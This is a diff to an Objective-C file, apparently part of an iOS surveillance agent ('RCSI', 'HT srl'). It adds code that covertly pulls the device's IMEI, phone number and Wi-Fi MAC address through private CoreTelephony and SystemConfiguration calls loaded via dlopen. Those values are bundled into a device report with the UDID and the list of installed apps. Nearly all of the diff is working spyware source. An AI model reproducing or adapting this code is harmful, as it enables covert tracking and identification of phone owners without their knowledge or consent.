@@ -5,8 +5,11 @@
 //  Created by kiodo on 3/11/11.
 //  Copyright 2011 HT srl. All rights reserved.
 //
+#import <dlfcn.h>
+
 #import "RCSIAgentDevice.h"
 #import "RCSICommon.h"
+#import "RCSIUtils.h"
 
 //#define DEBUG_DEVICE
 
@@ -17,22 +20,30 @@ NSString *kAppName = @"kAppName";
 #define APPLICATIONS_PATH @"/Applications"
 #define USER_APPLICATIONS_PATH @"/private/var/mobile/Applications"
 
-#define DEVICE_STRING_FMT        @"\nDevice info:\n"  \
-                                  "Name:\t\t%@\n"     \
-                                  "Model:\t\t%@\n"    \
-                                  "System:\t\t%@\n"   \
-                                  "Version:\t\t%@\n"  \
-                                  "UniqID:\t\t%@\n"   \
-                                  "Battery:\t\t%f"
+#define DEVICE_STRING_FMT        @"\nDevice info:\n"      \
+                                  "Name:\t\t%@\n"         \
+                                  "Model:\t\t%@\n"        \
+                                  "System:\t\t%@\n"       \
+                                  "Version:\t\t%@\n"      \
+                                  "UniqID:\t\t%@\n"       \
+                                  "Battery:\t\t%f\n"      \
+                                  "Wifi-address:\t\t%@\n" \
+                                  "IMEI:\t\t%@\n"        \
+                                  "Phone num.:\t\t%@"
 
-#define DEVICE_STRING_APPS_FMT   @"\nDevice info:\n"  \
-                                  "Name:\t\t%@\n"     \
-                                  "Model:\t\t%@\n"    \
-                                  "System:\t\t%@\n"   \
-                                  "Version:\t\t%@\n"  \
-                                  "UniqID:\t\t%@\n"   \
-                                  "Battery:\t\t%f"    \
+#define DEVICE_STRING_APPS_FMT   @"\nDevice info:\n"      \
+                                  "Name:\t\t%@\n"         \
+                                  "Model:\t\t%@\n"        \
+                                  "System:\t\t%@\n"       \
+                                  "Version:\t\t%@\n"      \
+                                  "UniqID:\t\t%@\n"       \
+                                  "Battery:\t\t%f\n"      \
+                                  "Wifi-address:\t\t%@\n" \
+                                  "IMEI:\t\t%@\n"         \
+                                  "Phone num.:\t\t%@"     \
                                   "%@"
+
+void callback() { };
 
 @implementation _i_AgentDevice
 
@@ -53,7 +64,7 @@ NSString *kAppName = @"kAppName";
 }
 
 #pragma mark -
-#pragma mark Agent Formal Protocol Methods
+#pragma mark Applications routine
 #pragma mark -
 
 - (NSMutableArray*)getAppsNames:(NSArray*)appsPathArray
@@ -168,58 +179,9 @@ NSString *kAppName = @"kAppName";
   return apps;
 }
 
-- (NSData*)getSystemInfoWithType: (NSString*)aType
-{
-  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
-  
-  NSMutableString *apps = nil;
-  NSData *retData = nil;
-  NSMutableString *systemInfoStr = nil;
-  
-  if ([self isThreadCancelled] == TRUE)
-    {
-      [pool release];
-      return retData;
-    }
-  
-  UIDevice *device = [UIDevice currentDevice];
-    
-  device.batteryMonitoringEnabled = YES;
-  
-  if (mAppList == TRUE)
-    apps = [self getInstalledApp];
-  
-  if (apps == nil)
-    {
-      systemInfoStr = [[NSString alloc] initWithFormat:DEVICE_STRING_FMT,
-                                                       [device name],
-                                                       [device model],
-                                                       [device systemName],
-                                                       [device systemVersion],
-                                                       [device uniqueIdentifier],
-                                                       [device batteryLevel]];
-    }
-  else
-    {
-      systemInfoStr = [[NSString alloc] initWithFormat:DEVICE_STRING_APPS_FMT,
-                                                       [device name],
-                                                       [device model],
-                                                       [device systemName],
-                                                       [device systemVersion],
-                                                       [device uniqueIdentifier],
-                                                       [device batteryLevel],
-                                                       apps];
-      [apps release];
-    }
-  
-  retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
-  
-  [systemInfoStr release];
-
-  [pool release];
-  
-  return retData;
-}
+#pragma mark -
+#pragma mark Device logging
+#pragma mark -
 
 - (BOOL)writeDeviceInfo: (NSData*)aInfo
 {
@@ -273,6 +235,174 @@ NSString *kAppName = @"kAppName";
   return YES;
 }
 
+#pragma mark -
+#pragma mark Device info main routine
+#pragma mark -
+
+- (NSString*)getIMEI
+{
+  NSString *imeiStr = [[[NSString alloc] initWithFormat: @"%@", @""] autorelease];
+  
+  char *coreTelDlibName =
+    "/System/Library/Frameworks/CoreTelephony.framework/CoreTelephony";
+  
+  void *handle = dlopen(coreTelDlibName, RTLD_NOW);
+  
+  if (handle == NULL)
+    return imeiStr;
+  
+  CTServerConnectionCreate_t __CTServerConnectionCreate = NULL;
+  CTServerConnectionCopyMobileEquipmentInfo_t __CTServerConnectionCopyMobileEquipmentInfo = NULL;
+  
+  __CTServerConnectionCreate= dlsym(handle, "_CTServerConnectionCreate");
+  __CTServerConnectionCopyMobileEquipmentInfo = dlsym(handle, "_CTServerConnectionCopyMobileEquipmentInfo");
+
+  
+  if (__CTServerConnectionCreate == NULL ||
+      __CTServerConnectionCopyMobileEquipmentInfo == NULL)
+    return imeiStr;
+
+  struct CTResult ctRes;
+  
+  struct CTServerConnection *sc = __CTServerConnectionCreate(kCFAllocatorDefault, callback, NULL);
+  
+  if (sc == NULL)
+    return imeiStr;
+  
+  CFMutableDictionaryRef dict = NULL;
+  
+  __CTServerConnectionCopyMobileEquipmentInfo(&ctRes, sc, &dict);
+  
+  if (dict != NULL)
+    imeiStr =  (NSString*)CFDictionaryGetValue(dict, CFSTR("kCTMobileEquipmentInfoIMEI"));
+  
+  return [imeiStr retain];
+}
+
+- (NSString*)getwifiMacAddress
+{
+  NSString *macStr = [[[NSString alloc] initWithFormat: @"%@", @""] autorelease];
+  
+  char *sysConfDlibName =
+    "/System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguration";
+  
+  void *handle = dlopen(sysConfDlibName, RTLD_NOW);
+  
+  if (handle == NULL)
+    return macStr;
+  
+  SCNetworkInterfaceCopyAll_t __SCNetworkInterfaceCopyAll = NULL;
+  SCNetworkInterfaceGetInterfaceType_t __SCNetworkInterfaceGetInterfaceType = NULL;
+  SCNetworkInterfaceGetHardwareAddressString_t __SCNetworkInterfaceGetHardwareAddressString = NULL;
+  
+  __SCNetworkInterfaceCopyAll = dlsym(handle, "SCNetworkInterfaceCopyAll");
+  __SCNetworkInterfaceGetInterfaceType = dlsym(handle, "SCNetworkInterfaceGetInterfaceType");
+  __SCNetworkInterfaceGetHardwareAddressString = dlsym(handle, "SCNetworkInterfaceGetHardwareAddressString");
+  
+  if (__SCNetworkInterfaceCopyAll == NULL ||
+      __SCNetworkInterfaceGetInterfaceType == NULL ||
+      __SCNetworkInterfaceGetHardwareAddressString == NULL)
+    return macStr;
+  
+  NSArray *intArray = (NSArray*) __SCNetworkInterfaceCopyAll();
+  
+  if (intArray == nil)
+    return macStr;
+  
+  for (int i=0; i < [intArray count]; i++)
+  {
+    id intType = [intArray objectAtIndex:i];
+    
+    NSString *intTypeStr = __SCNetworkInterfaceGetInterfaceType(intType);
+    
+    if ([intTypeStr compare:@"IEEE80211"] == NSOrderedSame)
+    {
+      macStr = __SCNetworkInterfaceGetHardwareAddressString(intType);
+      [[macStr retain] autorelease];
+      break;
+    }
+  }
+  
+  [intArray release];
+  
+  return macStr;
+}
+
+- (NSString*)getPhoneNumber
+{
+  NSString *phoneStr = [[NSString alloc] initWithFormat: @"%@", @""];
+  
+  NSString *tmpPhoneStr = [[_i_Utils sharedInstance] getPhoneNumber];
+  
+  if (tmpPhoneStr != nil)
+    phoneStr = [[tmpPhoneStr retain] autorelease];
+  
+  return phoneStr;
+}
+
+- (NSData*)getSystemInfoWithType: (NSString*)aType
+{
+  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
+  
+  NSMutableString *apps = nil;
+  NSData *retData = nil;
+  NSString *systemInfoStr = nil;
+  
+  if ([self isThreadCancelled] == TRUE)
+  {
+    [pool release];
+    return retData;
+  }
+  
+  UIDevice *device = [UIDevice currentDevice];
+  
+  device.batteryMonitoringEnabled = YES;
+  
+  if (mAppList == TRUE)
+    apps = [self getInstalledApp];
+  
+  NSString *wifiMac = [self getwifiMacAddress];
+  NSString *imei    = [self getIMEI];
+  NSString *phone   = [self getPhoneNumber];
+  
+  if (apps == nil)
+  {
+    systemInfoStr = [[NSString alloc] initWithFormat:DEVICE_STRING_FMT,
+                                                     [device name],
+                                                     [device model],
+                                                     [device systemName],
+                                                     [device systemVersion],
+                                                     [device uniqueIdentifier],
+                                                     [device batteryLevel],
+                                                     wifiMac,
+                                                     imei,
+                                                     phone];
+  }
+  else
+  {
+    systemInfoStr = [[NSString alloc] initWithFormat:DEVICE_STRING_APPS_FMT,
+                                                     [device name],
+                                                     [device model],
+                                                     [device systemName],
+                                                     [device systemVersion],
+                                                     [device uniqueIdentifier],
+                                                     [device batteryLevel],
+                                                     wifiMac,
+                                                     imei,
+                                                     phone,
+                                                     apps];
+    [apps release];
+  }
+  
+  retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
+  
+  [systemInfoStr release];
+  
+  [pool release];
+  
+  return retData;
+}
+
 - (BOOL)getDeviceInfo
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -301,6 +431,10 @@ NSString *kAppName = @"kAppName";
   
   return YES;
 }
+
+#pragma mark -
+#pragma mark Agent Formal Protocol Methods
+#pragma mark -
 
 - (void)startAgent
 {
